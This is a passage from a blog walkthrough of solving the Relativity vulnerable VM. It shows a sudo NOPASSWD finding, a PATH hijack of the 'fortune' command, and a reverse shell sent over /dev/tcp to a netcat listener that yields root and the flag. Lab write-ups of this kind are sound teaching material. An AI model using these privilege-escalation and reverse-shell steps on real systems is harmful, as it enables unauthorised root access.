</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right&hellip; well that is not exactly very helpful&hellip; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum->sploit->post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&hellip;</p>

<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>

<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>

<h3>the shortest straw</h3>

<p>I reran <code>auth_server</code> a few more times, and decided to push the binary through strings one more time, just to see if <em>maybe</em> the clue will be more clear now:</p>

<figure class='code'><figcaption><span>auth_server Strings-ed</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># strings auth_server</span>
</span><span class='line'>/lib64/ld-linux-x86-64.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>fflush
</span><span class='line'>puts
</span><span class='line'>putchar
</span><span class='line'><span class="nb">printf</span>
</span><span class='line'>poll
</span><span class='line'>stdout
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.2.5
</span><span class='line'>l<span class="nv">$ </span>L
</span><span class='line'>t<span class="k">$(</span>L
</span><span class='line'><span class="p">|</span><span class="nv">$0H</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...
</span><span class='line'><span class="k">done</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...
</span><span class='line'>could not establish connection
</span><span class='line'>invalid certificates
</span><span class='line'>error: <span class="o">(</span>12<span class="k">)</span>
</span><span class='line'>fortune -s <span class="p">|</span> /usr/bin/cowsay
</span><span class='line'>Starting Auth server..
</span><span class='line'><span class="p">;</span>*3<span class="nv">$&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a <code>sudo -l</code>, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:</p>

<figure class='code'><figcaption><span>jetta&#8217;s sudo -l</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>sudo: sorry, you must have a tty to run sudo
</span><span class='line'><span class="o">[</span>jetta@Relativity ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>jetta on this host:
</span><span class='line'>    requiretty, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span>
</span><span class='line'><span class="s2">    LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS</span>
</span><span class='line'><span class="s2">    LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span>
</span><span class='line'><span class="s2">    LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER</span>
</span><span class='line'><span class="s2">    LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span>
</span><span class='line'><span class="s2">    XAUTHORITY PATH&quot;</span>, env_reset
</span><span class='line'>
</span><span class='line'>User jetta may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/jetta/auth_server/auth_serveyr
</span><span class='line'>sh-4.2<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>And there it is! <code>auth_server</code> may be run as root with no password requirement! \o/. Immediately I jumped to running <code>sudo /home/jetta/auth_server/auth_server</code>, just to be met with the same fate of &lsquo;error(12)&rsquo;. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the &lsquo;Checking Certs&rsquo;, &lsquo;Contacting Server&rsquo; part, then, run <code>fortune -s | /usr/bin/cowsay</code> and error(12).</p>

<p>&hellip; wait a sec. <code>fortune</code> is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this <code>fortune</code> command, then I may be able to root the box. Especially if I can make it think my bash shell is <code>fortune</code> :)</p>

<h3>finishing off</h3>

<p>With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called <code>fortune</code>, which was simply the old bash command pushed over /dev/tcp again, and placing it in <em>/home/jetta/bin</em>. I then ensured that <code>fortune</code> was executable and tested it by just running it alone. It was working fine :)</p>

<p>Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran <code>auth_server</code> as root, and switched to my last nc listener on port 6677&hellip;</p>

<figure class='code'><figcaption><span>auth_server Exploitation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="sb">```</span>@Relativity ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s2">&quot;import pty;pty.spawn(&#39;/bin/sh&#39;);&quot;</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
</span><span class='line'>&lt;etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
</span><span class='line'>sh-4.2<span class="nv">$ </span><span class="nb">hash</span> -r
</span><span class='line'>sh-4.2<span class="nv">$ </span>sudo auth_server/auth_server
</span><span class='line'>sudo auth_server/auth_server
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Checking Certificates...done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Contacting server, please wait...could not establish connection
</span><span class='line'>error: <span class="o">(</span>12<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>auth_server</code> did its usual trick with error(12), however, my netcat listener now had a root prompt \o/</p>

<figure class='code'><figcaption><span>root shell and flag.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># nc -lvp 6677</span>
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 6677 ...
</span><span class='line'>192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to <span class="o">[</span>&lt;snip&gt;<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.21<span class="o">]</span> 38267
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># id</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># locate flag.txt</span>
</span><span class='line'>locate flag.txt
</span><span class='line'>/root/flag.txt
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># cat /root/flag.txt</span>
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>65afa0e5928b98f7ae283e16df2d43bf
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/4">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/2">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/09/18/from-persistence/">From Persistence, to pain, to PWN</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/17/kali-linux-oracle-support/">Kali Linux Oracle Support</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/15/taming-the-troll/">taming (actually just solving) the troll</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/09/beating-xerxes2/">Beating Xerxes 2 (no, not the Persian King)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/08/07/flick-can-you-find-the-flag/">flick - can you find the flag?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/20/hell-would-just-not-freeze-over/">Hell would just not freeze over!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">dnsfilexfer - yet another take on file transfer via DNS</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a>
      </li>
    
      <li class="post">
        <a href="/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/">Zeus - My Adventure with a Infamous Bot</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
